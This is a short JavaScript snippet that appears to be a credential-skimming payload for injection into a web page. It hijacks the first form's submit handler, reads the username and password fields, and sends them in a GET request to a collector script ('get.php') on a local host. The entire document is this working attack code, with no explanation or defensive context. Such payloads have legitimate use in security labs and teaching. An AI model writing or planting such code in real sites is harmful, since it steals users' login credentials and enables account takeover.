document.forms[0].onsubmit = function sendCreds(){
    var username = document.forms[0].elements[1].value;
    var password = document.forms[0].elements[2].value;
    var uri = "http://127.0.0.1:8080/get.php?username="+username+"&password="+password;
    xhr = new XMLHttpRequest();
    xhr.open("GET", uri, true);
    xhr.send();
};
